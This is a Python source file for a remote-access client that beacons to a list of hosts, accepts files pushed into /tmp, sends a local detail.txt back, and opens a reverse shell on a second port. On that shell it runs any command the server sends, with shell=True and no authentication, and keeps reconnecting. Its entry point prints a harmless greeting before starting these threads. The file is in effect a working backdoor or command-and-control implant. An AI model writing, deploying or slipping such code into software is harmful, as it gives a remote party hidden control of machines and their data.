import socket
import time
import struct
import subprocess
import threading
import os
import sys


# Define host and port
# HOSTS = [ '162.254.1.65','162.254.1.64','103.76.138.126']  # Example IP list
HOSTS = [ '192.168.0.100','192.168.0.101']  # Example IP list

PORT = 8010         # The port used by the server
SHELL_PORT = 8020   # shell port

def details_file(client_socket):
    while True:
        print("hello")
        head= client_socket.recv(1)
        print('head======================',head)
        data_type = int(head[0])
        if data_type!=3:
            continue

def recv_all(sock, size):
    data = b''
    while len(data) < size:
        packet = sock.recv(size - len(data))
        if not packet:
            return None
        data += packet
    return data

def receive_file(client_socket):
    directory = '/tmp'
    os.makedirs(directory, exist_ok=True)

    # Set a timeout for the socket
    client_socket.settimeout(20)  # Increased timeout to 20 seconds

    while True:
        try:
            #print("Waiting to receive header...")
            head = client_socket.recv(1)

            if not head:
                print("Connection closed by the server")
                break

            #print('head======================', head)
            header = int(head[0])

            if header == 0:
                while True:
                    try:
                        # Receive the file name size first
                        raw_file_name_size = client_socket.recv(4)

                        if len(raw_file_name_size) < 4:
                            print("Failed to receive the complete file name size")
                            continue
                        print("len(raw_file_name_size)======", len(raw_file_name_size))
                        file_name_size = struct.unpack('!I', raw_file_name_size)[0]
                        print(f"File name size: {file_name_size} bytes")

                        # Receive the file name
                        file_name = recv_all(client_socket, file_name_size).decode('utf-8').strip()
                        print(f"Receiving file: {file_name}")

                        # Receive the file size
                        raw_file_size = client_socket.recv(8)
                        if len(raw_file_size) < 8:
                            print("Failed to receive the complete file size")
                            continue

                        file_size = struct.unpack('!Q', raw_file_size)[0]
                        print(f"File size: {file_size} bytes")

                        # Receive the file data
                        file_data = b''
                        bytes_received = 0
                        while bytes_received < file_size:
                            chunk = client_socket.recv(min(file_size - bytes_received, 1048576))
                            if not chunk:
                                print("Connection closed prematurely")
                                break
                            file_data += chunk
                            # print("file_data===============",file_data)
                            bytes_received += len(chunk)

                        if bytes_received == file_size:
                            with open(os.path.join(directory, file_name), 'wb') as f:
                                f.write(file_data)

                        else:
                            print("File reception incomplete")
                        confirmation_header = bytes([4])  # Header to indicate this is a confirmation message
                        confirmation_message = f"File '{file_name}' received successfully"
                        client_socket.sendall(confirmation_header + confirmation_message.encode('utf-8'))
                        print("Confirmation message with header sent to server")
                        #header = bytes([4])
                        #client_socket.sendall(header)
                        #print("==================File received successfully============")


                    except socket.timeout:
                        print("Timeout occurred while receiving data")
                        time.sleep(5)  # Wait before trying again
                    except Exception as e:
                        print(f"An error occurred while receiving the file: {e}")
                        time.sleep(5)  # Wait before trying again
                    #print("helololololololololololololo========================================")
                    break
            elif header == 3:
                print("I am able to send file back")
                with open('detail.txt', 'rb') as file:
                    chunk = file.read()  # Read 1024 bytes from the file
                    if not chunk:
                        break  # End of file
                    header = bytes([2])
                    client_socket.sendall(header + chunk)

        except socket.timeout:
            print("Timeout occurred while waiting for header")
        except Exception as e:
            print(f"An error occurred: {e}")
            break  # Exit the loop if any other exception occurs
            # with open('detail.txt', 'rb') as file:
            #     chunk = file.read()  # Read 1024 bytes from the file
            #     if not chunk:
            #         break  # End of file
            #     header = bytes([4])
                # client_socket.sendall(header + chunk)

def rename_delete_line(file_path):
    with open(file_path, 'r') as file:
        lines = file.readlines()

    if not lines:
        return None

    first_line = lines[0]

    with open(file_path, 'w') as file:
        file.writelines(lines[1:])

    new_file_path = os.path.join('tmp', first_line.strip())

    # Rename the file
    os.rename(file_path, new_file_path)

def handle_connection(ip):
    header = bytes([2])    # 0x02 = heartbeat/data
    print('header',header)
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                client_socket.connect((ip, PORT))
                print(f"[{ip}] Connected")
                client_socket.settimeout(10)

                # Start receive thread
                receive_thread = threading.Thread(target=receive_file, args=(client_socket,))
                receive_thread.daemon = True
                receive_thread.start()

                # Keep sending messages
                while True:
                    message = "00 0C 00 00 00 00 06 07 08 09 00 00 02 4C B0 16 EA AA 00 00 00 03 00 00 00 00 00 00 17 71 00 00 00 00 00 00 23 29 00 00 00 00 00 00 31 10"
                    client_socket.sendall(header + message.encode())
                    time.sleep(1)

        except (ConnectionRefusedError, ConnectionResetError, BrokenPipeError) as e:
            print(f"[{ip}] Connection error: {e}. Reconnecting in 5 seconds...")
            time.sleep(5)
        except Exception as e:
            print(f"[{ip}] Unexpec ted error: {e}. Reconnecting in 5 seconds...")
            time.sleep(5)
            


def connect_Terminal(ip):
    """Shell client"""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, SHELL_PORT))
            print(f"[+] Connected to server for terminal on {SHELL_PORT}")

            while True:
                data = s.recv(4096)
                if not data:
                    print("[-] Server closed connection")
                    break

                header = data[0]
                payload = data[1:].decode(errors="ignore")
                
                
                if header != 5:
                    print(f"[!] Unknown header: {header}")
                    continue
                
                cmd = payload.strip()
                print(f"[Shell] Executing: {cmd}")
                # Expecting command with header 0x05
                
                cmd = payload.strip()
                if cmd.lower() in ["exit", "quit"]:
                    print("[*] Exit received, closing client...")
                    s.close()
                    return

                try:
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                except subprocess.CalledProcessError as e:
                    output = e.output
                except Exception as e:
                    output = str(e).encode()

                if not output:
                    output = b"[+] Command executed (no output)\n"

                # Send back with header 0x06
                try:
                    s.send(bytes([6]) + output)
                except Exception as e:
                    print(f"[-] Send failed: {e}")
                    break
                
            s.close()  # ensure cleanup before reconnect
        except Exception as e:
            print(f"[-] Connection failed: {e}. Retrying in 5s...")
            time.sleep(5)



def connect_and_send_messages():
    for ip in HOSTS:
        thread = threading.Thread(target=handle_connection, args=(ip,))
        thread.daemon = True
        thread.start()

    # Keep main thread alive
    while True:
        time.sleep(60)
        


def connect_and_open_terminal():
    for ip in HOSTS:
        thread = threading.Thread(target=connect_Terminal, args=(ip,))
        thread.daemon = True
        thread.start()

    # Keep main thread alive
    while True:
        time.sleep(60)


if __name__ == "__main__":


    if len(sys.argv) > 1:
        name = sys.argv[1]
        print(f"Hello, {name}!")
    else:
        print("Hello, world!")
    # Start heartbeat/file transfer
    threading.Thread(target=connect_and_send_messages, daemon=True).start()

    # Start shell connection (separate port)
    threading.Thread(target=connect_and_open_terminal, daemon=True).start()

    # Keep main alive
    while True:
        time.sleep(60)

